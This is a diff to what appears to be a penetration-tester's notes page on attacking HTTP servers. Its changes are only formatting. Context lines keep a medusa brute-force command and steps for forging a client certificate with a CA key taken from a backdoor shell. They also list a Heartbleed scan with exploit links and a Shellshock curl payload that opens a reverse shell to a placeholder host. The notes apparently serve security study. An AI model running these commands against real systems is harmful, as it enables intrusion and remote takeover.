@@ -5,6 +5,7 @@
 >  -- <cite>[Wikipedia](https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol)</cite>
 
 ## Related
+
 [Enumeration/Webserver scanning](../02-enumeration/03-webserver-scanning.md)
 
 ## Information gathering
@@ -51,8 +52,8 @@ medusa -h <ip> -u <user> -P <wordlist-file> -M http -m DIR:/admin -T 10
 
 ## Sign SSL certificate
 
-* got private key from vsftpd backdoor php shell (`ca.key`)
-* export certificate from Firefox (`ca.crt`)
+* Got private key from vsftpd backdoor php shell (`ca.key`)  
+* Export certificate from Firefox (`ca.crt`)
 
 ```bash
 openssl pkey -in ca.key -pubout
@@ -65,11 +66,11 @@ openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12
 openssl verify -verbose -CAfile ca.crt client.cer
 ```
 
--> Firefox -> Preferences -> Search certificates -> Import "client.p12", Import "ca.crt" (trust)
+-> Firefox -> Preferences -> Search certificates -> Import "client.p12", Import "ca.crt" (trust)  
 
 ### Troubleshooting
 
-* no permission to file, but to folder? -> re-create file!
+* No permission to file, but to folder? -> re-create file!
 
 ## Heartbleed
 
@@ -89,8 +90,8 @@ nmap -sV --script=ssl-heartbleed -oA nmap_heartbleed <ip>
 
 ### Exploits
 
-[How to Exploit the Heartbleed Bug](https://stackabuse.com/how-to-exploit-the-heartbleed-bug/)
-[GitHub - sensepost/heartbleed-poc: Test for SSL heartbeat vulnerability (CVE-2014-0160)](https://github.com/sensepost/heartbleed-poc)
+* [How to Exploit the Heartbleed Bug](https://stackabuse.com/how-to-exploit-the-heartbleed-bug/)
+* [GitHub - sensepost/heartbleed-poc: Test for SSL heartbeat vulnerability (CVE-2014-0160)](https://github.com/sensepost/heartbleed-poc)
 
 ## Shellshock
 
@@ -105,8 +106,8 @@ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -i >& /dev/tcp/<ip>/<port>
 ```
 
 ## Apache2
-Debian: `/etc/apache2/`
-CentOS: `/etc/httpd/`
+Debian: `/etc/apache2/`  
+CentOS: `/etc/httpd/`  
 
 Find document root:
 ```bash
